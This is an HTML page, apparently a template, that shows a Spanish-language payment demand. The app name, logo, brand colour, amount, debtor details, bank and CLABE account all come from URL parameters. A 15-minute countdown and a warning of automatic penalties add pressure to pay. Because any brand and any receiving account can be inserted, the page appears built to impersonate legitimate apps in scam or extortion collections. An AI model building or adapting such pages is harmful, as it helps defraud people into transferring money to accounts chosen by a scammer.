<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Detalle de Pago</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { font-family: 'Inter', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; background-color: #f1f5f9; padding: 1rem; }
        .detail-card { width: 100%; max-width: 440px; background: white; border-radius: 2.5rem; overflow: hidden; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1); text-align: center; }
    </style>
</head>
<body>

    <div class="detail-card">
        <!-- Encabezado con color dinámico -->
        <div id="header-bg" class="pt-10 pb-6 text-center text-white flex flex-col items-center justify-center">
            <div class="w-20 h-20 bg-white rounded-3xl mb-3 flex items-center justify-center overflow-hidden border-4 border-white/20 shadow-md">
                <img id="img-app" src="" class="w-full h-full object-cover">
            </div>
            <h2 id="txt-app" class="text-xl font-black uppercase tracking-wider"></h2>
        </div>

        <!-- Contenido de Pago -->
        <div class="p-6 space-y-6">
            <div>
                <span class="text-[10px] text-gray-400 font-bold uppercase tracking-wider block">Monto a Pagar</span>
                <span id="txt-monto" class="text-4xl font-black text-slate-800">$0.00</span>
                <span id="timer" class="text-base font-black text-red-500 block mt-1">14:59</span>
            </div>

            <!-- Tabla de datos limpios -->
            <div class="bg-slate-50 rounded-[2rem] p-5 text-left space-y-4 border border-slate-100 text-xs font-bold text-slate-700">
                <div class="flex justify-between border-b border-slate-200/60 pb-2">
                    <span class="text-gray-400 uppercase text-[9px] tracking-wider">Cliente</span>
                    <span id="txt-cliente" class="uppercase text-slate-900"></span>
                </div>
                <div class="flex justify-between border-b border-slate-200/60 pb-2">
                    <span class="text-gray-400 uppercase text-[9px] tracking-wider">Teléfono</span>
                    <span id="txt-tel" class="text-slate-900"></span>
                </div>
                <div class="flex justify-between border-b border-slate-200/60 pb-2">
                    <span class="text-gray-400 uppercase text-[9px] tracking-wider">Banco Destino</span>
                    <span id="txt-banco" class="font-black text-slate-900">BBVA</span>
                </div>

                <!-- Bloque de transferencia interactivo -->
                <div class="pt-2 text-center space-y-2">
                    <span class="text-[9px] text-gray-400 uppercase tracking-wider block">CLABE Para Transferir</span>
                    <div class="flex items-center justify-center space-x-2 bg-white border border-slate-200/80 rounded-xl p-2.5 shadow-sm">
                        <span id="txt-clabe" class="text-blue-600 font-black text-sm tracking-wide"></span>
                        <button onclick="copiarClabe()" class="text-blue-500 hover:text-blue-700 transition-colors p-1 bg-blue-50 rounded-lg">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
                                <path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                            </svg>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Advertencia inferior -->
            <p class="text-[9px] font-black text-red-500 uppercase leading-tight px-4">
                ⚠️ Advertencia: Realiza el pago en menos de 15 minutos para evitar penalizaciones automáticas.
            </p>
        </div>
    </div>

    <script>
        const p = new URLSearchParams(window.location.search);
        
        document.getElementById('header-bg').style.backgroundColor = p.get('c1') || '#820ad1';
        document.getElementById('img-app').src = p.get('img') || '';
        document.getElementById('txt-app').innerText = p.get('v') || 'Aplicación';

        const montoFormateado = parseFloat(p.get('m') || 0).toLocaleString('es-MX', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        document.getElementById('txt-monto').innerText = '$' + montoFormateado;
        document.getElementById('txt-cliente').innerText = p.get('n') || 'CLIENTE';
        document.getElementById('txt-tel').innerText = p.get('t') || '0000000000';
        document.getElementById('txt-clabe').innerText = p.get('c') || '000000000000000000';

        let bancoLimpio = p.get('b') || 'BBVA';
        bancoLimpio = bancoLimpio.replace(/[123]/g, '').trim(); 
        document.getElementById('txt-banco').innerText = bancoLimpio;

        let tiempo = 15 * 60 - 1;
        const timerElement = document.getElementById('timer');
        const interval = setInterval(() => {
            let minutos = Math.floor(tiempo / 60);
            let segundos = tiempo % 60;
            segundos = segundos < 10 ? '0' + segundos : segundos;
            timerElement.innerText = `${minutos}:${segundos}`;
            if (tiempo <= 0) clearInterval(interval);
            tiempo--;
        }, 1000);

        function copiarClabe() {
            const clabe = document.getElementById('txt-clabe').innerText;
            navigator.clipboard.writeText(clabe).then(() => {
                alert('CLABE copiada al portapapeles');
            });
        }
    </script>
</body>
</html>
